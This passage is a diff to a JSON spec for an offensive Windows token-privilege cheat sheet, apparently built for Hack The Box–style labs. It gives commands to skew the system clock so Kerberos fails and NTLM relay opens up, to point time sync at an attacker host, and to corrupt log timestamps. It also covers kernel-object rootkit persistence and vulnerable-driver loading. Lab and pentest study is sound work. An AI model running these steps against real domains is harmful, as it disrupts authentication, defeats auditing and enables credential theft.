+          "attack": "Create permanent kernel objects (named mutexes, events, semaphores, sections) in the kernel object namespace that persist beyond process lifetime. Primary abuse: (1) Kernel rootkit persistence — named section object survives process exit, can be mapped by any process with correct name. (2) Race condition exploit aid — create permanent named pipe/mutex before SYSTEM service to win naming race. (3) Memory-mapped file sections for cross-process data injection without standard WriteProcessMemory (harder to detect).",
+          "tools": {
+            "poc": "github.com/gtworek/PSBits — contains SeCreatePermanentPrivilege PoC",
+            "winapi": "NtCreateMutant / NtCreateEvent / NtCreateSection with OBJ_PERMANENT flag",
+            "detection_bypass": "Permanent objects in \\BaseNamedObjects\\ appear to system monitoring as legitimate kernel objects"
+          },
+          "page_to_add": false,
+          "add_to_table_only": true,
+          "nav_section": null,
+          "table_notes": "Rarely delegated — almost only seen on LocalSystem or kernel-mode drivers. If present on user account, use PSBits PoC. Primary value: rootkit-level persistence primitive."
+        }
+      ],
+      "html_implementation": {
+        "SeSystemtimePrivilege": {
+          "add_nav_item": true,
+          "nav_section": "🔑 Rare / Situational",
+          "nav_label": "SeSystemtimePrivilege",
+          "page_id": "sesystemtime",
+          "severity_badge": "sev-gold",
+          "page_subtitle": "// CHANGE SYSTEM CLOCK → BREAK KERBEROS → CORRUPT AUDIT LOGS → FORCE NTLM FALLBACK",
+          "info_cards": [
+            {"label": "Who Has It", "value": "Server Operators, some svc accounts — appeared in svc-printer token on HTB Return"},
+            {"label": "Primary Attack", "value": "Set time >5min off DC → all new Kerberos auth fails → force NTLM fallback"},
+            {"label": "Secondary", "value": "Corrupt audit log timestamps, bypass cert validity windows"},
+            {"label": "Result", "value": "Auth disruption / NTLM relay opportunity / log corruption"}
+          ],
+          "steps": [
+            {
+              "num": "1",
+              "title": "Verify privilege",
+              "code": "whoami /priv | findstr SeSystemtime\nREM Enable if Disabled:\nREM Run EnableAllTokenPrivs.ps1 first"
+            },
+            {
+              "num": "2",
+              "title": "Check current time and DC time for reference",
+              "code": "time /t\nnet time \\\\DC_HOSTNAME\nw32tm /stripchart /computer:DC_HOSTNAME /samples:3 /dataonly"
+            },
+            {
+              "num": "3",
+              "title": "Method A — PowerShell (most reliable)",
+              "code": "Set-Date -Date ((Get-Date).AddMinutes(10))\nREM Or set specific time:\nSet-Date -Date '2025-01-01 12:00:00'"
+            },
+            {
+              "num": "4",
+              "title": "Method B — cmd.exe",
+              "code": "REM Set time (24h format):\ntime 23:59:59\nREM Set date:\ndate 01/01/2099"
+            },
+            {
+              "num": "5",
+              "title": "Method C — w32tm (domain-aware, can point to fake NTP)",
+              "code": "w32tm /config /manualpeerlist:{{KALI_IP}} /syncfromflags:manual /update\nw32tm /resync /force\nREM Kali: install and run fake NTP: sudo python3 -m pip install ntplib && use custom NTP server"
+            },
+            {
+              "num": "6",
+              "title": "Verify Kerberos is broken (optional — confirms attack worked)",
+              "code": "klist\nREM Try to access domain resource — should fail with KRB_AP_ERR_SKEW if >5min drift\ndir \\\\DC_HOSTNAME\\SYSVOL"
+            },
+            {
+              "num": "REVERT",
+              "title": "REVERT — restore time sync BEFORE leaving (mandatory)",
+              "code": "w32tm /config /syncfromflags:domhier /update\nw32tm /resync /force\nREM Alternative if w32tm unavailable:\nnet time \\\\DC_HOSTNAME /set /y"
+            }
+          ],
+          "alerts": [
+            {
+              "type": "alert-red",
+              "icon": "⚠",
+              "text": "MANDATORY REVERT: If you drift clock >5 minutes and forget to restore, your own WinRM/SMB/Kerberos sessions will start failing. Revert time BEFORE closing your shell."
+            },
+            {
+              "type": "alert-gold",
+              "icon": "💡",
+              "text": "Kerberos clock skew tolerance is exactly 5 minutes (default). 6 minutes = all NEW auth fails. Existing tickets remain valid until their expiry time (default 10 hours). Use this window."
+            },
+            {
+              "type": "alert-teal",
+              "icon": "🔗",
+              "text": "Reference: Priv2Admin SeSystemtimePrivilege entry | Kerberos clock skew RFC 4120 Section 5.2"
+            }
+          ]
+        },
+        "SeSystemProfilePrivilege": {
+          "add_nav_item": false,
+          "add_to_allprivs_table": true,
+          "table_row": {
+            "privilege": "SeSystemProfilePrivilege",
+            "threat": "LOW",
+            "method": "ETW kernel profiling",
+            "tool": "xperf, logman, Get-Counter",
+            "notes": "Low value alone. Investigate if SeDebugPrivilege also present — ETW + debug = kernel memory read path."
+          }
+        },
+        "SeCreatePagefilePrivilege": {
+          "add_nav_item": false,
+          "add_to_allprivs_table": true,
+          "table_row": {
+            "privilege": "SeCreatePagefilePrivilege",
+            "threat": "LOW",
+            "method": "Pagefile manipulation",
+            "tool": "wmic pagefileset, Set-WmiInstance",
+            "notes": "Solo: low value. Chained with SeBackupPrivilege: force memory to pagefile → read pagefile.sys → may contain LSASS creds (no Credential Guard)."
+          }
+        },
+        "SeCreatePermanentPrivilege": {
+          "add_nav_item": false,
+          "add_to_allprivs_table": true,
+          "table_row": {
+            "privilege": "SeCreatePermanentPrivilege",
+            "threat": "LOW",
+            "method": "Permanent kernel objects",
+            "tool": "PSBits PoC, NtCreateSection (WinAPI)",
+            "notes": "Rootkit persistence primitive. Rarely delegated to user accounts. Almost exclusively LocalSystem/kernel drivers."
+          }
+        }
+      }
+    }
+  },
+
+  "validation_requirements": {
+    "test_each_command_in": [
+      "evil-winrm (ruby gem version 3.x)",
+      "evil-winrm-py (Python port)",
+      "cmd.exe (Windows Server 2019)",
+      "PowerShell 5.1 (default on Server 2019)",
+      "PowerShell 7.x (Core — optional)",
+      "Constrained Language Mode PS"
+    ],
+    "error_messages_to_document": [
+      "Cannot open Service Control Manager on computer '.'. → Use sc.exe qc SVCNAME directly",
+      "[SC] StartService FAILED 1053 → EXPECTED when cmd payload exits fast. Check result separately.",
+      "[SC] OpenService FAILED 5: Access is denied → Service protected or wrong service, try another",
+      "Missing closing '}' in statement block → Multi-line PS in evil-winrm, use one-liner",
+      "Unexpected token '}' → Same cause as above",
+      "Access is denied (robocopy) → SeBackupPrivilege not enabled, run EnableAllTokenPrivs.ps1 first",
+      "NtLoadDriver failed STATUS_INVALID_IMAGE_HASH → Capcom.sys blocked, use szkg64.sys instead"
+    ]
+  },
+
+  "html_implementation_notes": {
+    "new_alert_type": "Add alert-shell class for shell compatibility warnings — orange border, cmd-icon",
+    "code_block_labels": "Add data-shell='evil-winrm|cmd|ps|universal' attribute to code blocks — use CSS to show shell badge",
+    "collapsible_sections": "Consider making 'Alternative X' subsections collapsible by default — primary method shown, alternatives hidden until clicked",
+    "copy_button_improvement": "Copy button should strip HTML entities (&#128279; etc) before copying to clipboard — current version may copy raw HTML",
+    "varbar_improvement": "Add DOMAIN variable to varbar — many commands need DOMAIN\\USER format",
+    "new_varbar_fields": ["DOMAIN (domain name)", "SVCNAME (target service name)", "DLLNAME (DLL hijack target filename)"]
+  },
+
+  "writeup_references_to_add": [
+    {
+      "machine": "Return (HTB)",
+      "technique": "Server Operators → VSS binPath → net localgroup",
+      "key_lesson": "Error 1053 is expected. Verify with net localgroup not sc exit code. sc query may fail — use sc.exe qc directly on named service.",
+      "url": "https://0xdf.gitlab.io/2022/01/15/htb-return.html"
+    },
+    {
+      "machine": "Acute (HTB)",
+      "technique": "SeImpersonatePrivilege → PrintSpoofer → SYSTEM",
+      "key_lesson": "PSRemoting context affects which privileges survive token filtering",
+      "url": "https://0xdf.gitlab.io/2022/07/23/htb-acute.html"
+    },
+    {
+      "machine": "Fuse (HTB)",
+      "technique": "SeLoadDriverPrivilege → EOPLOADDRIVER → Capcom → ExploitCapcom",
+      "key_lesson": "Print Operators group grants SeLoadDriver automatically",
+      "url": "https://0xdf.gitlab.io/2021/02/27/htb-fuse.html"
+    },
+    {
+      "machine": "Blackfield (HTB)",
+      "technique": "Backup Operators → SeBackupPrivilege → diskshadow → NTDS.dit → secretsdump",
+      "key_lesson": "Evil-WinRM strips SeBackupPrivilege. Use PSRemoting loopback session.",
+      "url": "https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html"
+    },
+    {
+      "machine": "Monteverde (HTB)",
+      "technique": "SeBackupPrivilege → reg save → secretsdump offline",
+      "key_lesson": "reg save works without diskshadow on non-DC boxes",
+      "url": "https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html"
+    },
+    {
+      "machine": "Forest (HTB)",
+      "technique": "Account Operators → add to Exchange Windows Permissions → DCSync",
+      "key_lesson": "Account Operators can add to non-protected groups including Exchange groups",
+      "url": "https://0xdf.gitlab.io/2020/03/21/htb-forest.html"
+    },
+    {
+      "machine": "Access (PG Practice)",
+      "technique": "SeManageVolumePrivilege → C:\\ write → PrintConfig DLL hijack → SYSTEM",
+      "key_lesson": "SeManageVolumePrivilege works even when Disabled — self-enables. Error 1053 = payload ran.",
+      "url": "https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9"
+    },
+    {
+      "machine": "Symbolic (PG Practice)",
+      "technique": "SeTcbPrivilege → TcbElevation.exe → SYSTEM",
+      "key_lesson": "SeTcbPrivilege is rare but instant SYSTEM. TcbElevation.exe is the tool.",
+      "url": "https://github.com/b4lisong/SeTcbPrivilege-Abuse"
+    }
+  ],
+
+  "execution_instructions": {
+    "step1": "Read the existing token.html completely to understand current structure and CSS/JS patterns",
+    "step2": "For each section listed in sections_to_enhance: locate the existing page div by id, add new subsections AFTER existing content without removing anything",
+    "step3": "Add new nav items in sidebar for: shellcompat (Shell Troubleshooting) and quickwins (Quick Wins) pages",
+    "step4": "Add new page divs for shellcompat and quickwins following the exact same HTML pattern as existing pages",
+    "step5": "Update varbar to add DOMAIN, SVCNAME, DLLNAME fields and update applyVars() JS function",
+    "step6": "Update the writeups page with new references listed in writeup_references_to_add",
+    "step7": "DO NOT change: CSS variables, header, varbar layout, existing nav structure, existing page content unless it is a documented correction",
+    "step8": "DO NOT remove any existing sections — only add and enhance",
+    "step9": "Preserve all {{VARIABLE}} template placeholders — they are substituted at runtime by JS",
+    "step10": "Test that copy buttons work on all new code blocks by ensuring they follow the existing .code-block pattern"
+  }
+}
